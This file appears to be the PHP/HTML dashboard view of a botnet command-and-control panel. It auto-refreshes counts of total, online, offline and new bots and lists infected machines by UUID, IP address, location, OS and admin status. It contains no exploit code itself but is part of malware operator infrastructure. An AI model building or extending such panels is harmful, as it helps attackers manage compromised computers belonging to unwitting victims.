<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">	
	<script>
		setInterval(function () {
			$.ajax({
				url: 'data/update',
				type:"GET",
				success: function (resp) {
					var data = {};
					try{
						data = JSON.parse(resp);
						$('#total').text(data['total']);
						$('#online').text(data['online']);
						$('#offline').text(data['offline']);
						$('#new').text(data['new']);
					}catch(e){

					}
					
				}
			});
			
		}, 10000);
	</script>
	<div class="row" style="margin-top:10px;">
		<div class="col-xs-6 col-md-3">
			<div class="panel panel-default">
				<div class="panel-body easypiechart-panel">
					<h4>Total Bots</h4>
					<div class="easypiechart" id="easypiechart-blue" data-percent="100%" ><span class="percent" id="total"><?php echo $total_bots;?></span></div>
				</div>
			</div>
		</div>
		<div class="col-xs-6 col-md-3">
			<div class="panel panel-default">
				<div class="panel-body easypiechart-panel">
					<h4>Bots Online</h4>
					<div class="easypiechart" id="easypiechart-teal" data-percent="100" ><span class="percent" id="online"><?php echo $bots_online;?></span></div>
				</div>
			</div>
		</div>
		<div class="col-xs-6 col-md-3">
			<div class="panel panel-default">
				<div class="panel-body easypiechart-panel">
					<h4>Bots Offline</h4>
					<div class="easypiechart" id="easypiechart-red" data-percent="100" ><span class="percent" id="offline"><?php echo $bots_offline;?></span></div>
				</div>
			</div>
		</div>
		<div class="col-xs-6 col-md-3">
			<div class="panel panel-default">
				<div class="panel-body easypiechart-panel">
					<h4>New Bots Today</h4>
					<div class="easypiechart" id="easypiechart-orange" data-percent="100" ><span class="percent" id="new"><?php echo $bot_new;?></span></div>
				</div>
			</div>
		</div>
	</div><!--/.row-->	

	<div class="row">
		<div class="col-lg-12">
			<div class="panel panel-default">
				<div class="panel-heading">Bot List</div>
				<div class="panel-body">
					<table data-toggle="table" data-url="data/bots" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="status" data-sort-order="asc">
						<thead>
							<tr>
								<th data-field="id" data-sortable="true">Bot ID</th>
								<th data-field="machine_id"  data-sortable="true">Machine UUID</th>
								<th data-field="ipv4" data-sortable="true">IPv4</th>
								<th data-field="location" data-sortable="true">Location</th>
								<th data-field="os" data-sortable="true">Operating System</th>
								<th data-field="isAdmin" data-sortable="true">Admin</th> 
								<th data-field="version" data-sortable="true">Version</th>
								<th data-field="last_seen" data-sortable="true">Last Seen</th>
								<th data-field="status" data-sortable="true">Status</th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div><!--/.row-->	


</div>	<!--/.main-->